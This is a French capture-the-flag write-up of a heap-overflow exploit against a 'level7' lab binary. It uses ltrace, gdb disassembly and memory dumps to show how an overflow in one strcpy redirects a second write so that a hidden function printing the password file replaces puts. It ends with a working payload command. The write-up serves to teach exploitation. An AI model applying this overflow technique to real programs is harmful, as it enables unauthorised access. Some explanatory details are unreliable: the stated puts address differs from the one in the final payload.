# Malloc Exploitation

En décompilant l'exécutable, on remarque plusieurs appels à `malloc`, et deux appels à `strcpy`. À la fin du programme, l'exécutable fait un appel à `puts`, juste après avoir ouvert le fichier `.pass` avec `fopen`. La fonction qui `m`, qui n'est jamais appelée, nous permettrait d'afficher le contenu de `.pass` à partir de la variable `c`.

Notre but est donc de remplacer l'adresse de la fonction `puts`, par l'adresse de la fonction `m`. Pour cela, commençons par trouver les adresses retournés par `malloc`. Nous pourrions le faire avec `gdb` comme dans l'exercice précédent, mais `ltrace` nous permet de le faire plus rapidement.
```
> ltrace ./level7
__libc_start_main(0x8048521, 1, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                 = 0x0804a008
malloc(8)                                                                 = 0x0804a018
malloc(8)                                                                 = 0x0804a028
malloc(8)                                                                 = 0x0804a038
strcpy(0x0804a018, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Nous savons donc que nos allocations commencent à partir de `0x0804a008`. Les premières instructions du programmes sont importantes, car elle lui permettent d'écrire des adresses mémoires dans nos `buffers` de `malloc`.
```c
puVar1 = (undefined4 *)malloc(8);
*puVar1 = 1;
uVar2 = malloc(8);
puVar1[1] = uVar2;
puVar3 = (undefined4 *)malloc(8);
*puVar3 = 2;
uVar2 = malloc(8);
puVar3[1] = uVar2;
```
Passons à présent sur `gdb` et imprimons nos emplacements mémoires alloués par `malloc` juste avant le premier appel à `strcpy`.
```
> gdb level7 --args "AAAA" "BBBB"
[...]
> (gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
> (gdb) b *0x080485a0
Breakpoint 1 at 0x80485a0
> (gdb) r
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x080485a0 in main ()
```
```
> (gdb) x/20wx 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
            ^           ^
            *puVar1 = 1 puVar1[1] = uVar2
                        
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
            ^           ^
            *puVar3 = 2 puVar3[1] = uVar2
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```
Nous allons donc profiter du double appel à `strcpy` pour remplacer l'adresse de la fonction `puts` par l'adresse de la fonction `m`. Pour cela, il faut comprendre le fonctionnement des deux `strcpy`.

---

**Premier `strcpy`**

Copie notre premier argument à l'adresse contenue dans `puVar1[1]`.
```c
strcpy(puVar1[1], envp[1]);
```

**Deuxième `strcpy`**

Copie notre deuxième argument à l'adresse contenue dans `puVar3[1]`.
```c
strcpy(puVar3[1], envp[2]);
```

On peut visuellement le représenter de cette manière :

```
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
                        ^
                        adresse de copie
                        du premier strcpy           
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
            ^
            le premier strcpy
            copie ici
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
                        ^
                        adresse de copie
                        du deuxième strcpy
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
            ^
            le deuxième strcpy
            copie ici
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```

---

Notre objectif est donc de remplacer l'adresse contenue dans `puVar3[1]` par l'adresse de la fonction `puts` et ansi, "tromper" le second `strcpy` en le faisant copier à l'adresse de la fonction `puts`. Pour cela, on peut créer un `overflow` grace au premier `strcpy` et ainsi écraser l'adresse de copie du deuxième `strcpy`.

Notre premier argument doit donc contenir un certains nombre de caractères pour atteindre l'adresse de copie du deuxième `strcpy`, ainsi que l'adresse de la fonction `puts`.

---

On peut obtenir les adresses des fonctions `puts` et `m` avec `gdb`.

**Fonction `puts`**

```
> (gdb) disas main
[...]
0x080485f7 <+214>:	call   0x8048400 <puts@plt>
[...]
```
L'adresse de la fonction `puts` est `0x8048400`.

**Fonction `m`**

```
> (gdb) x m
0x80484f4 <m>:	0x83e58955
```
L'adresse de la fonction `m` est `0x80484f4`.

---

Visuellement, voici à quoi doit ressembler la mémoire après l'appel au premier `strcpy` :
```
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011           
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
            ^
            le premier strcpy
            copie ici
0x804a028:	0x41414141	0x08048400	0x00000000	0x00000011
                        ^
                        adresse de copie
                        du deuxième strcpy
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```

En deuxième arguement, nous avons simplement à fournir l'adresse de la fonction `m`. Finalement, voici la commande à exécuter :
```
./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
```
